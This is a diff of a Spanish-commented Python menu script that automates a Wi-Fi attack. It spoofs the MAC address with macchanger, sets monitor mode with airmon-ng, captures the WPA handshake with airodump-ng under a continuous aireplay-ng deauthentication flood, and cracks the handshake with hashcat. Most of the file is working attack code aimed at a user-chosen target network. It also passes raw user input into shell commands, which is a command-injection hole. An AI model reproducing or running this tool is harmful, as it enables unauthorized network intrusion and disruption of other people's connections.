@@ -20,7 +20,7 @@ print("\033[1;37;1m ")
 
 #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Variables principales $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Variables ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-listamenu=["opciones:","1) selec Wlan & changer Mac" ,"2) Scaner red ", "3) capture", "4) crack", "5) Exit"]#Menu Princcipal
+listamenu=["Opciones:","1) Scaner red ", "2) Capture", "3) Crack", "4) Exit"]#Menu Princcipal
 key=0
 exit=False
 #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ OPciones MEnu ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -30,61 +30,46 @@ def menu():
 	print(listamenu[2])
 	print(listamenu[3])
 	print(listamenu[4])
-	print(listamenu[5])
-
-global bssid
-global canal
-global diccionario
-global caracter
 #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 
 #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ FUNCIONES PRINCIPALES $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ CONFIGURACION $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ FUNCION SELECCION ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-def config():
-	global wlan
-	while True:
-		try:
-			os.system("ifconfig")
-			wlan=input("Introduzca Wlan: ")
-			print("Procesando")
-			os.system('ip link set '+wlan+' up')
-			os.system('airmon-ng check kill')
-			os.system('ifconfig '+wlan+' down')
-			os.system('macchanger -A '+wlan)
-			os.system('ifconfig '+wlan+' up')
-			time.sleep(2) 
-			os.system('airmon-ng start '+wlan)
-			print(wlan)
-			return wlan
-			break
-		except TypeError:
-			print("Wlan no permitida")
-
-def scan(wlan):
+def scan():
 	global bssid
 	global canal
 	global diccionario
 	global caracter
 	global dic
-	while True:
-		try:
-			os.system('wash -i '+wlan)
-			bssid=input("seleccione BSSID : ")
-			canal=input("seleccione CHANEL : ")
-			dic=input("Desea seleccionar diccionario? y o n :")
-			if(dic=='y'):
-				diccionario=input("Introduzca ruta diccionario: ")
-				caracter=1
-			else:
-				caracter=input("Introduzca caracteres:")
-				diccionario=1
-			return bssid, canal, diccionario, dic, caracter
-			break
-		except TypeError:
-			print("Wlan no permitida")
+	time_scan=input("Seleccione tiempo de escaneo default 60 : ")
+	if(time_scan==''):
+		time_scan="60"
+	os.system('nmcli -w '+time_scan+' device wifi list')
+	bssid=input("seleccione BSSID : ")
+	canal=input("seleccione CHANEL : ")
+	dic=input("Desea seleccionar diccionario? y o n :")
+	if(dic=='y'):
+		diccionario=input("Introduzca ruta diccionario: ")
+		caracter=1
+	else:
+		caracter=input("Introduzca caracteres:")
+		diccionario=1
+	return bssid, canal, diccionario, dic, caracter
 
-def attack(wlan,bssid,canal):
+def attack(bssid,canal):
+	os.system("ifconfig")
+	wlan=input("Introduzca Wlan: ")
+	print("Procesando")
+	os.system('airmon-ng check kill')
+	os.system('ifconfig '+wlan+' down')
+	os.system('iwconfig wlan0 mode monitor')
+	os.system('macchanger -A '+wlan)
+	os.system('ifconfig '+wlan+' up')
+	time.sleep(2) 
+	os.system('airmon-ng start '+wlan)
+	if(wlan!='wlan0mon'): #falta condicion or
+		os.system('airmon-ng start '+wlan)
+	print(wlan)
 	os.system('x-terminal-emulator -e airodump-ng -c '+canal+' -w file --bssid '+bssid+' '+wlan)
 	os.system('x-terminal-emulator -e aireplay-ng -0 0 -a'+bssid+' '+wlan+' --ignore-negative-one')
 
@@ -94,27 +79,22 @@ def crack(diccionario,dic,caracter):
 		os.system('x-terminal-emulator -e hashcat -m 2500 /root/Especial_termux_kali/file-01.hccapx '+ diccionario)
 	else:
 		os.system('x-terminal-emulator -e hashcat -m 2500 -a3 /root/Especial_termux_kali/file-01.hccapx '+caracter)
-
-
 #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ MENU $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ EJECUCION DEL PROGRAMA ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 while exit==False:
 	menu()
 	key=(int(input()))
 	if (key==1):
-		config()
+		scan()
 	elif (key==2):
-		scan(wlan)
+		attack(bssid,canal)
 	elif (key==3):
-		attack(wlan,bssid,canal)
-	elif (key==4):
 		crack(diccionario,dic,caracter)
-
-	elif (key==5):
-		#os.syste('airmon-ng stop wlan0mon')
-		#os.syste('ifconfig wlan0 down')
-		#os.syste('iwconfig wlan0 mode managed')
-		#os.syste('ifconfig wlan0 up')
-		#os.system('service network-manager start')
+	elif (key==4):
+		os.system('airmon-ng stop wlan0mon')
+		os.system('ifconfig wlan0 down')
+		os.system('iwconfig wlan0 mode managed')
+		os.system('ifconfig wlan0 up')
+		os.system('service network-manager start')
 		exit=True
 #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
